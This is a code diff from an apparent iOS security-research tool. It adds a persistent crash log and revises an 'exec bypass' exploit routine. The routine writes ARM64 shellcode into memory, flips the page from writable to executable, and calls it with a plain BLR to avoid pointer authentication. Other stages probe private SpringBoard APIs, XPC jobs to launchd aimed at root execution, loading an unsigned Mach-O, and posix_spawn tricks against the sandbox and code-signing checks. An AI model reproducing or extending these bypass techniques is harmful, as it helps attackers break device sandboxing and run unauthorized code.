@@ -73,6 +73,70 @@ static char *buf_finish(void) {
     return result;
 }
 
+// ── Persistent breadcrumb logger ──
+// Writes to Documents/breadcrumbs.log so logs survive crashes.
+// Call bc_init() at start of any research function, bc() to log.
+// kresearch_read_breadcrumbs() returns the file contents.
+
+static FILE *g_bc_file = NULL;
+
+static void bc_init(void) {
+    @autoreleasepool {
+        NSString *docs = [NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
+        // Truncate on each new run so we only have the latest
+        g_bc_file = fopen([path UTF8String], "w");
+        if (g_bc_file) {
+            fprintf(g_bc_file, "[BC] breadcrumb log started\n");
+            fflush(g_bc_file);
+        }
+    }
+}
+
+static void bc(const char *fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    char line[1024];
+    vsnprintf(line, sizeof(line), fmt, ap);
+    va_end(ap);
+
+    // Write to stderr (visible if attached)
+    fprintf(stderr, "%s", line);
+
+    // Write to persistent file (survives crash)
+    if (g_bc_file) {
+        fprintf(g_bc_file, "%s", line);
+        fflush(g_bc_file);  // flush every line — crash safe
+    }
+}
+
+static void bc_close(void) {
+    if (g_bc_file) {
+        fprintf(g_bc_file, "[BC] breadcrumb log complete\n");
+        fclose(g_bc_file);
+        g_bc_file = NULL;
+    }
+}
+
+// Public API: read the last breadcrumbs from disk
+char *kresearch_read_breadcrumbs(void) {
+    @autoreleasepool {
+        NSString *docs = [NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
+        NSData *data = [NSData dataWithContentsOfFile:path];
+        if (!data || data.length == 0) {
+            char *msg = strdup("(no breadcrumbs found — run a command first)");
+            return msg;
+        }
+        char *result = (char *)malloc(data.length + 1);
+        memcpy(result, data.bytes, data.length);
+        result[data.length] = '\0';
+        return result;
+    }
+}
+
 static bool kaddr_ok(uint64_t addr) {
     return (addr >= VM_MIN_KERNEL_ADDRESS && addr <= VM_MAX_KERNEL_ADDRESS);
 }
@@ -466,6 +530,8 @@ char *kresearch_dump_sandbox_profile(void) {
 }
 
 char *kresearch_swap_sandbox_profile(void) {
+    bc_init();
+    bc("[SWAP] v11 starting\n");
     buf_init();
     buf_append("=== EXEC BYPASS v11 - JIT + PRIVATE API EXPLOIT ===\n");
     buf_append("v10 confirmed: RWX memory ALLOWED, private frameworks load,\n");
@@ -475,12 +541,13 @@ char *kresearch_swap_sandbox_profile(void) {
 
     // ══════════════════════════════════════════════════════════════
     // TEST A: JIT code execution via inline assembly
-    // v10 showed RWX is allowed. Now test if we can actually
-    // EXECUTE code we write. Use inline asm with BR (not BLRAAZ)
-    // to bypass arm64e PAC on indirect calls.
+    // v10 showed vm_protect RWX returns kr=0, but SPTM likely
+    // enforces W^X at hardware level — page stays writable so
+    // instruction fetch faults (EXC_BAD_ACCESS crash).
+    // Fix: proper W^X flow — write as RW, flip to RX, then exec.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test A: JIT execution\n");
-    buf_append("-- Test A: JIT code execution --\n");
+    bc("[SWAP] Test A: JIT execution (W^X safe)\n");
+    buf_append("-- Test A: JIT code execution (W^X safe) --\n");
     {
         vm_address_t addr = 0;
         vm_size_t size = 0x4000;
@@ -491,47 +558,75 @@ char *kresearch_swap_sandbox_profile(void) {
                    kr, (unsigned long)addr);
 
         if (kr == KERN_SUCCESS) {
+            // Step 1: Set page to RW (writable, not executable)
             kr = vm_protect(mach_task_self(), addr, size,
-                FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
-            buf_append("  vm_protect RWX: kr=%d\n", kr);
+                FALSE, VM_PROT_READ | VM_PROT_WRITE);
+            buf_append("  vm_protect RW: kr=%d\n", kr);
 
             if (kr == KERN_SUCCESS) {
-                // Write ARM64: mov x0, #42; ret
+                // Step 2: Write ARM64 shellcode: mov x0, #42; ret
                 uint32_t code[] = {
                     0xd2800540, // mov x0, #42
                     0xd65f03c0  // ret
                 };
                 memcpy((void *)(uintptr_t)addr, code, sizeof(code));
-                sys_icache_invalidate((void *)(uintptr_t)addr, sizeof(code));
                 buf_append("  Wrote shellcode at 0x%lx\n",
                            (unsigned long)addr);
 
-                // Call via inline assembly using BR (not BLRAAZ)
-                // BR doesn't check PAC — bypasses arm64e pointer auth
-                uint64_t result = 0;
-                fprintf(stderr, "[SWAP] Calling JIT code...\n");
+                // Verify write
+                uint32_t readback = *(uint32_t *)(uintptr_t)addr;
+                buf_append("  Readback: 0x%08x (expect 0xd2800540)\n", readback);
+
+                // Step 3: Flush icache BEFORE flipping to RX
+                sys_icache_invalidate((void *)(uintptr_t)addr, sizeof(code));
+                buf_append("  icache flushed\n");
+
+                // Step 4: Flip page to RX (executable, no longer writable)
+                // This is the W^X-safe path — SPTM should allow this
+                kern_return_t kr2 = vm_protect(mach_task_self(), addr, size,
+                    FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+                buf_append("  vm_protect RX: kr=%d\n", kr2);
+
+                if (kr2 == KERN_SUCCESS) {
+                    // Step 5: Execute JIT code
+                    uint64_t result = 0;
+                    bc("[SWAP] Calling JIT code (W^X safe)...\n");
 #if __arm64e__
-                __asm__ volatile(
-                    "mov x9, %1\n"   // load JIT addr into x9
-                    "blr x9\n"       // branch-link-register (no PAC check)
-                    "mov %0, x0\n"   // capture return value
-                    : "=r"(result)
-                    : "r"((uint64_t)addr)
-                    : "x0", "x1", "x2", "x3", "x4", "x5",
-                      "x6", "x7", "x8", "x9", "x30", "memory"
-                );
+                    // Use plain BLR (not BLRAAZ) to skip PAC on call target.
+                    // The JIT code's RET uses the lr set by BLR — no PAC involved.
+                    __asm__ volatile(
+                        "mov x9, %1\n"   // load JIT addr into x9
+                        "blr x9\n"       // branch-link-register (no PAC check)
+                        "mov %0, x0\n"   // capture return value
+                        : "=r"(result)
+                        : "r"((uint64_t)addr)
+                        : "x0", "x1", "x2", "x3", "x4", "x5",
+                          "x6", "x7", "x8", "x9", "x30", "memory"
+                    );
 #else
-                // Non-arm64e: normal function pointer call
-                typedef uint64_t (*jit_fn)(void);
-                result = ((jit_fn)(uintptr_t)addr)();
+                    // Non-arm64e: normal function pointer call
+                    typedef uint64_t (*jit_fn)(void);
+                    result = ((jit_fn)(uintptr_t)addr)();
 #endif
-                buf_append("  JIT returned: %llu (expected 42)\n",
-                           (unsigned long long)result);
-                if (result == 42) {
-                    buf_append("  *** JIT CODE EXECUTION WORKS! ***\n");
-                    buf_append("  >>> We can write and execute arbitrary ARM64 <<<\n");
+                    bc("[SWAP] JIT returned: %llu\n",
+                            (unsigned long long)result);
+                    buf_append("  JIT returned: %llu (expected 42)\n",
+                               (unsigned long long)result);
+                    if (result == 42) {
+                        buf_append("  *** JIT CODE EXECUTION WORKS! ***\n");
+                        buf_append("  >>> W^X safe JIT: write RW, flip RX, execute <<<\n");
+                    } else {
+                        buf_append("  JIT ran but returned wrong value\n");
+                    }
                 } else {
-                    buf_append("  JIT ran but returned wrong value\n");
+                    buf_append("  *** vm_protect RX DENIED (kr=%d) ***\n", kr2);
+                    buf_append("  SPTM blocks RW->RX transition too!\n");
+
+                    // Fallback: try RWX (maybe SPTM is lenient?)
+                    kern_return_t kr3 = vm_protect(mach_task_self(), addr, size,
+                        FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
+                    buf_append("  Fallback vm_protect RWX: kr=%d\n", kr3);
+                    buf_append("  (NOT executing — would crash if W^X enforced)\n");
                 }
             }
 
@@ -544,7 +639,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // This private API tells SpringBoard to launch an app.
     // Different code path than posix_spawn — goes via XPC to SB.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test B: SBS launch app\n");
+    bc("[SWAP] Test B: SBS launch app\n");
     buf_append("\n-- Test B: Launch app via SpringBoardServices --\n");
     {
         void *sbs = dlopen("/System/Library/PrivateFrameworks/"
@@ -606,7 +701,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // Try submitting a launchd job via XPC. If we can talk to
     // launchd, we can potentially run code as root.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test C: XPC to launchd\n");
+    bc("[SWAP] Test C: XPC to launchd\n");
     buf_append("\n-- Test C: XPC to launchd --\n");
     {
         // Use Objective-C xpc wrappers
@@ -685,7 +780,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // writing our OWN Mach-O and loading it. Code signing will
     // likely block this, but we need to know the exact error.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test D: custom dylib\n");
+    bc("[SWAP] Test D: custom dylib\n");
     buf_append("\n-- Test D: Write and load custom Mach-O --\n");
     {
         NSArray *docPaths = NSSearchPathForDirectoriesInDomains(
@@ -735,7 +830,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // Previous tests used default attrs. Try with specific flags
     // that might bypass the sandbox/AMFI check.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test E: posix_spawn variants\n");
+    bc("[SWAP] Test E: posix_spawn variants\n");
     buf_append("\n-- Test E: posix_spawn with different attrs --\n");
     {
         // Test 1: posix_spawn with POSIX_SPAWN_SETEXEC (replace process)
@@ -789,6 +884,8 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append("  If D(dylib) works: load custom code via dlopen\n");
     buf_append("  If E(spawn-self) works: re-exec our own binary\n");
 
+    bc("[SWAP] v11 complete\n");
+    bc_close();
     return buf_finish();
 }
 
